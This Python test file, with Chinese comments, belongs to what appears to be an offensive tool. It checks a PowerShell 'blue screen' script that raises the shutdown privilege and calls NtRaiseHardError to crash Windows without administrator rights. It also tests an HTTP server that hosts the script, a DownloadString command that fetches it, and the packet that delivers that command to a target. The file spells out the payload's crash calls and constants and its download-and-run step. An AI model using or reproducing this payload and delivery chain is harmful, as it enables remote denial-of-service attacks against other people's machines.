"""蓝屏脚本托管与报文组装的离线回归测试。"""

import urllib.request

import app.packets.blue_screen as blue_screen
import app.packets.codec as codec
import app.packets.constants as constants
from tests.fixtures.offline import OfflineCase


class BlueScreenTests(OfflineCase):
    def test_script_raises_hard_error_with_shutdown_privilege(self):
        script = constants.BLUE_SCREEN_SCRIPT
        self.assertIn('DllImport("ntdll.dll")', script)
        self.assertIn("RtlAdjustPrivilege(int a,int b,int c,out int r)", script)
        self.assertIn(
            "NtRaiseHardError(int a,int b,int c,int d,int e,out int f)", script
        )
        self.assertIn(
            "[void][N.W]::RtlAdjustPrivilege(%d,1,0,[ref]$r)"
            % constants.BLUE_SCREEN_PRIVILEGE,
            script,
        )
        self.assertIn(
            "[void][N.W]::NtRaiseHardError(%d,0,0,0,%d,[ref]$r)"
            % (constants.BLUE_SCREEN_STATUS, constants.BLUE_SCREEN_RESPONSE),
            script,
        )

    def test_script_needs_no_administrator_or_scheduled_task(self):
        script = constants.BLUE_SCREEN_SCRIPT
        self.assertNotIn("schtasks", script)
        self.assertNotIn("taskkill", script)
        self.assertNotIn("SYSTEM", script)

    def test_constants_match_documented_ntstatus_values(self):
        # 0xC0000420 以有符号 32 位写出来才是 PowerShell 能传进 Int32 的值。
        self.assertEqual(constants.BLUE_SCREEN_STATUS, 0xC0000420 - (1 << 32))
        self.assertEqual(constants.BLUE_SCREEN_STATUS & 0xFFFFFFFF, 0xC0000420)
        self.assertEqual(constants.BLUE_SCREEN_PRIVILEGE, 19)
        self.assertEqual(constants.BLUE_SCREEN_RESPONSE, 6)

    def test_payload_hint_reports_single_packet(self):
        hint = blue_screen.payload_hint()
        self.assertIn("NtRaiseHardError", hint)
        self.assertIn("报文 1 条", hint)

    def test_packets_are_one_command_packet(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        command = blue_screen.blue_screen_command("127.0.0.1")
        self.assertIn("DownloadString", command)
        self.assertIn(constants.BLUE_SCREEN_PATH, command)
        self.assertLessEqual(len(command), constants.COMMAND_MAX_BYTES // 2)
        packets = blue_screen.blue_screen_packets("127.0.0.1")
        self.assertEqual(len(packets), 1)
        self.assertEqual(packets[0], codec.pkg_sendlist("-c", command))

    def test_server_serves_the_script_once(self):
        # 服务用例走真实回环连接，先临时放开网络守卫。
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        server = blue_screen.BlueScreenServer("127.0.0.1")
        server.start()
        try:
            self.assertTrue(server.url.startswith("http://127.0.0.1:"))
            with urllib.request.urlopen(server.url, timeout=5) as response:
                body = response.read().decode("utf-8")
            self.assertEqual(body, constants.BLUE_SCREEN_SCRIPT)
            self.assertTrue(server.wait(5))
        finally:
            server.close()
        self.assertTrue(server.closed)

    def test_wait_times_out_without_a_fetch(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        server = blue_screen.BlueScreenServer("127.0.0.1")
        server.start()
        try:
            self.assertFalse(server.wait(0.1))
        finally:
            server.close()
